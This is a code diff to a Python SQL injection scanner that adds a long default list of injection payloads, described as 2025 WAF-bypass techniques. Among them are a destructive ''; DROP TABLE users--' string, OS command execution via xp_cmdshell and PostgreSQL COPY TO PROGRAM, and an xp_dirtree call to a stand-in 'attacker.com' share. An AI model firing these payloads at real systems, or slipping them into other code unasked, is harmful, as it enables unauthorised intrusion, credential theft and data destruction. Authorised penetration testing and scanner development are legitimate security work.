@@ -17,6 +17,7 @@ logger = logging.getLogger(__name__)
 
 class SQLiScanner(BaseScanner):
     """SQL Injection vulnerability scanner"""
+
     def __init__(
         self, target, payload_file=None, output_file=None, dynamic_payloads=None
     ):
@@ -38,23 +39,77 @@ class SQLiScanner(BaseScanner):
 
     def get_payloads(self):
         """Load SQL injection payloads"""
+        # Modern 2025 SQLi payloads - updated for latest WAF bypasses
         default_payloads = [
+            # Classic boolean-based
             "' OR '1'='1",
             "' OR 1=1#",
             "' OR 1=1--",
+            "' OR 1=1-- -",
             "' OR 1=1/*",
-            "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--",
-            "' UNION ALL SELECT NULL,NULL,NULL--",
+            "admin' OR '1'='1'-- -",
+            "admin'/**/OR/**/1=1#",
+            # Time-based blind SQLi (2025 techniques)
             "' OR SLEEP(5)--",
+            "' AND SLEEP(5)--",
             "'; WAITFOR DELAY '0:0:5'--",
             "' OR pg_sleep(5)--",
+            "' OR BENCHMARK(5000000,MD5(1))--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            # Union-based SQLi with NULL padding
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
+            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+            # Advanced WAF bypass techniques (2025)
+            "' /*!50000OR*/ 1=1-- -",
+            "' /*!12345UNION*/ /*!12345SELECT*/ NULL--",
+            "' OR 1=1%00",
+            "' OR 1=1%0A",
+            "' OR/**/1=1--",
+            "' OR%0D%0A1=1--",
+            "' UNION/**/SELECT/**/NULL--",
+            # JSON-based SQLi (modern APIs)
+            "' OR '1'='1' -- -",
+            "{\"id\": \"1' OR '1'='1\"}",
+            '{"username": "admin\'--"}',
+            # NoSQL injection (MongoDB, etc.)
+            "' || '1'=='1",
+            "' || 1==1//",
+            '{"$gt": ""}',
+            '{"$ne": null}',
+            "admin' && this.password.match(/.*/)//+%00",
+            # XML-based SQLi
+            "1' ORDER BY 1--",
+            "1' ORDER BY 2--",
+            "1' ORDER BY 3--",
+            # Boolean-based advanced
             "' AND 1=1--",
             "' AND 1=2--",
             "' OR 'x'='x",
+            "' AND 'a'='a",
+            "' AND 'a'='b",
+            # Information extraction
             "'; SELECT @@version--",
             "'; SELECT system_user()--",
             "'; SELECT current_database()--",
+            "' AND extractvalue(1,concat(0x7e,version()))--",
+            "' AND updatexml(1,concat(0x7e,database()),1)--",
+            # Stacked queries
+            "'; DROP TABLE users--",
+            "'; EXEC xp_cmdshell('whoami')--",
+            # PostgreSQL specific (2025)
+            "' OR 1=1; COPY (SELECT '') TO PROGRAM 'sleep 5'--",
+            "'; SELECT pg_sleep(5)--",
+            # MSSQL specific (2025)
+            "' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--",
+            "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
+            # MySQL specific (2025)
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            # Second-order SQLi
+            "admin'||'",
+            "' OR '1'='1'||'",
         ]
 
         if self.dynamic_payloads:
@@ -189,4 +244,6 @@ class SQLiScanner(BaseScanner):
             print(
                 f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}"
             )
-            print(f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}")
+            print(
+                f"\n{Config.COLOR_RED}[-] No SQLi vulnerabilities found.{Config.COLOR_RESET}"
+            )
